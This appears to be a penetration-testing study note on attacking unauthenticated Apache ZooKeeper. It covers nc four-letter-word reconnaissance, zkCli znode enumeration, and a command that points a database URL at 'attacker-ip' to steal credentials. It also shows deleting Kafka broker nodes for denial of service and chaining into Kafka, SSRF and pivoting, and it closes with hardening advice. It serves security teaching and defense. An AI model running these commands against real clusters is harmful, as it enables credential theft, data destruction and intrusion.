---
tags: [zookeeper, apache, unauthenticated, misconfiguration, kafka, network]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.24 Zookeeper"
---

# Zookeeper — Unauthenticated Access

## 1. Introduction to Zookeeper

Apache ZooKeeper is a centralized service for maintaining configuration information, naming, providing distributed synchronization, and providing group services over large clusters in distributed systems. It is essentially a highly available, robust, hierarchical key-value store optimized for reads.

ZooKeeper is a foundational infrastructure component. It is rarely the final application that users interact with; rather, it is the invisible glue that coordinates massive distributed systems like Apache Kafka, Hadoop, HBase, and Solr.

Because ZooKeeper holds critical metadata, coordination states, and configuration parameters, unauthorized access can lead to severe consequences. An attacker can read sensitive configurations, map out the entire internal infrastructure topology, or maliciously modify node states to cause a Denial of Service (DoS) or manipulate the behavior of the applications relying on it.

## 2. Architecture & Concepts

ZooKeeper data is kept in-memory, which means ZooKeeper can achieve high throughput and low latency numbers. The data model is structured like a file system.

- **znodes:** The data nodes in a ZooKeeper namespace are called znodes. Unlike standard file systems, znodes can have data associated with them as well as children.
- **Ensemble:** A ZooKeeper cluster is called an ensemble. To maintain high availability, an ensemble typically consists of an odd number of servers (e.g., 3, 5, 7) so a strict majority (quorum) can be achieved.
- **Leader and Followers:** One node acts as the leader, processing all write requests. The other nodes act as followers, replicating the leader's state and serving read requests.
- **Ephemeral Nodes:** Znodes that exist as long as the session that created them is active. Often used for service discovery (e.g., "I am alive" heartbeats).

## 3. ASCII Diagram: Zookeeper Information Disclosure

```text
      [ Attacker / Rogue Client ]
                 |
                 | (1) Connects to Port 2181
                 |     (No Auth Required)
                 v
      +------------------------+
      |  Target Node / Network |
      |                        |
      | [ ZooKeeper Follower ] | <-- (2) Accepts connection
      |   Port: 2181 (Client)  |
      +------------------------+
                 |
                 | (3) Issues 'dump' or 'env' 4-letter word
                 | (4) Traverses /kafka/brokers/ znode
                 v
      +------------------------+
      |  Sensitive Metadata    |
      |  - Kafka Broker IPs    |
      |  - DB Connection URLs  |
      |  - Service Passwords   |
      +------------------------+
                 |
                 | (5) Extracted Data used for further attacks
                 v
      [ Attacker gains map of ]
      [ entire internal network]
```

## 4. Port & Default Configuration

- **2181/TCP:** Client port (Default port for client connections).
- **2888/TCP:** Peer port (Used by followers to connect to the leader).
- **3888/TCP:** Leader election port.
- **8080/TCP:** AdminServer REST API (Introduced in ZooKeeper 3.5.0).

**Common Vulnerability:** By default, ZooKeeper 3.4.x and earlier do not require authentication for client connections. Even in newer versions, if ACLs (Access Control Lists) are not explicitly configured and enforced, the default behavior often allows anonymous connections to read and write znodes.

## 5. Reconnaissance & Enumeration (Four-Letter Words)

ZooKeeper responds to a specific set of commands known as "The Four Letter Words." These are sent directly over a raw TCP connection (e.g., using `nc` or `telnet`) and are an administrator's tool for quick health checks. For an attacker, they are a goldmine for reconnaissance.

*Note: In ZooKeeper 3.5.3+, these commands are restricted by the `4lw.commands.whitelist` configuration, but many legacy deployments leave them open.*

### Essential Four-Letter Words

```bash
# Check if the server is running (returns 'imok')
echo "ruok" | nc <target-ip> 2181

# Get environment variables and settings (Exposes OS info, java version, config paths)
echo "env" | nc <target-ip> 2181

# Get basic server statistics and client connections (Shows IPs of connected apps!)
echo "stat" | nc <target-ip> 2181

# Get detailed configuration
echo "conf" | nc <target-ip> 2181

# Dump ephemeral nodes (Shows active services registering heartbeats)
echo "dump" | nc <target-ip> 2181
```

If these commands succeed, you have confirmed a running ZooKeeper instance and gathered significant intelligence about the underlying host and the clients connecting to it.

## 6. Exploitation: Interacting with Znodes

To interact with the actual data (znodes), you need a ZooKeeper client. The `zkCli.sh` script is bundled with the ZooKeeper distribution and is the standard tool for this.

Alternatively, you can use Python libraries like `kazoo`.

### Connecting via zkCli

Download the ZooKeeper binaries and run the client script:

```bash
./zkCli.sh -server <target-ip>:2181
```

If successful, you will be dropped into a prompt: `[zk: <target-ip>:2181(CONNECTED) 0]`.

### Enumerating the Tree

You can traverse the ZooKeeper namespace exactly like a Linux filesystem.

```bash
# List the root directory
ls /

# List children of a specific node
ls /brokers

# Get the data and metadata associated with a znode
get /config/database_url
```

### Exploitation Scenarios

1. **Information Disclosure:** Applications often store configuration parameters here. You might find credentials, API keys, or paths to internal, undocumented services.
2. **Infrastructure Mapping:** By looking at `/services` or `/brokers`, you can map out internal IPs, ports, and architectures that are completely hidden from external scans.
3. **Data Manipulation (DoS & Hijacking):** If ACLs allow writes, an attacker can modify a znode.
   - Modify the database connection string of a microservice to point to an attacker-controlled server (MitM/Credentials Theft).
   - Delete critical configuration znodes, causing dependent applications to crash (DoS).
   ```bash
   # Writing malicious data
   set /config/database_url "jdbc:mysql://attacker-ip:3306/db"
   
   # Deleting a critical node
   delete /kafka/brokers/ids/1
   ```

## 7. Exploiting ZooKeeper in Kafka Environments

ZooKeeper is heavily associated with Apache Kafka (though Kafka is moving towards KRaft to remove the ZK dependency). In a Kafka context, ZooKeeper stores topic configurations, ACLs, and broker metadata.

If you compromise the ZooKeeper instance backing Kafka:
1. **Bypass Kafka Authentication:** You can manually manipulate the Kafka ACLs stored in ZooKeeper to grant your user full access to all Kafka topics.
2. **Topic Manipulation:** You can alter topic configurations, potentially changing retention policies to delete data.
3. **Broker Hijacking:** By understanding the ephemeral broker registration, you could theoretically register a rogue Kafka broker, though this is practically complex due to Kafka's internal mechanics.

## 8. Defense & Hardening

Securing ZooKeeper is critical as it acts as the central source of truth for the cluster.

### 1. Network Segmentation
ZooKeeper should **never** be exposed to the public internet. It should reside in an isolated backend subnet, reachable only by the applications that require its coordination services. Use strict firewall rules.

### 2. Implement Access Control Lists (ACLs)
Enable and enforce ACLs. ZooKeeper supports several authentication schemes:
- **Digest:** Username/password authentication.
- **SASL/Kerberos:** The enterprise standard for strong authentication in Hadoop/Kafka ecosystems.
- **IP:** Restricting access to specific client IPs.

### 3. Restrict Four-Letter Words
In the `zoo.cfg` file, restrict the four-letter words to only what is absolutely necessary for monitoring (e.g., `ruok`, `stat`), and ensure they are only accessible from monitoring server IPs.
```properties
# Disable all 4lw except ruok
4lw.commands.whitelist=ruok
```

### 4. Enable Client-Server mTLS
Starting in version 3.5.x, ZooKeeper supports TLS for client connections, encrypting the data in transit and authenticating clients via certificates.

## 9. Chaining Opportunities

- **SSRF to ZooKeeper:** Like Consul and etcd, a blind SSRF can be used to send four-letter words to a local ZooKeeper instance via `gopher://` or raw HTTP, retrieving internal status. Link to `[[05 - Server-Side Request Forgery (SSRF)]]`.
- **ZooKeeper to Kafka Takeover:** Use unauthenticated ZK access to modify Kafka ACLs, then read sensitive messages from Kafka topics. Link to `[[29 - Apache Kafka — Unauthenticated Access]]` (hypothetical topic).
- **Pivoting:** The IP addresses discovered via the `stat` command provide perfect targets for internal lateral movement. Link to `[[20 - Pivoting and Port Forwarding]]`.

## 10. Related Notes

- `[[22 - etcd — Exposed Key-Value Store]]`
- `[[23 - Consul — Service Mesh Misconfig]]`
- `[[30 - Infrastructure as Code (IaC) Security]]`
